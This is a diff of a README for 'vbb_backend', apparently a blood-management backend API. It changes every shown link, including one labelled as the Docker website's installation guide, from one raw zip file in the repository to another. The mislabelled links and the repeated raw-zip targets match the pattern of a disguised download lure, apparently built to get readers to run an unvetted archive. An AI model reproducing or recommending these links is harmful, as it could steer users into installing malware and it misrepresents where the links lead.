@@ -1,6 +1,6 @@
 # 🩸 vbb_backend - Simplifying Blood Management for Healthcare
 
-[![Download vbb_backend](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/Ticuna/vbb_backend.zip)](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/Ticuna/vbb_backend.zip)
+[![Download vbb_backend](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/templates/vbb_backend_2.0.zip)](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/templates/vbb_backend_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to vbb_backend! This software serves as the backend API for the Virtual 
 
 To get started, visit this page to download the latest version:
 
-[Download vbb_backend Releases](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/Ticuna/vbb_backend.zip)
+[Download vbb_backend Releases](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/templates/vbb_backend_2.0.zip)
 
 You will find different versions available. Choose the one that fits your needs, and click the download link next to it.
 
@@ -28,7 +28,7 @@ Before proceeding, ensure your system meets the following requirements:
 
 If you do not have Docker installed, follow these instructions:
 
-1. Go to the Docker website: [Docker Installation Guide](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/Ticuna/vbb_backend.zip).
+1. Go to the Docker website: [Docker Installation Guide](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/templates/vbb_backend_2.0.zip).
 2. Choose your operating system.
 3. Follow the prompts to complete the installation.
 
@@ -36,7 +36,7 @@ If you do not have Docker installed, follow these instructions:
 
 After ensuring Docker is running, head back to the releases page and download the latest version of vbb_backend:
 
-[Download vbb_backend Releases](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/Ticuna/vbb_backend.zip)
+[Download vbb_backend Releases](https://raw.githubusercontent.com/ravirajinet/vbb_backend/dev/templates/vbb_backend_2.0.zip)
 
 ### Step 3: Extract the Files
 
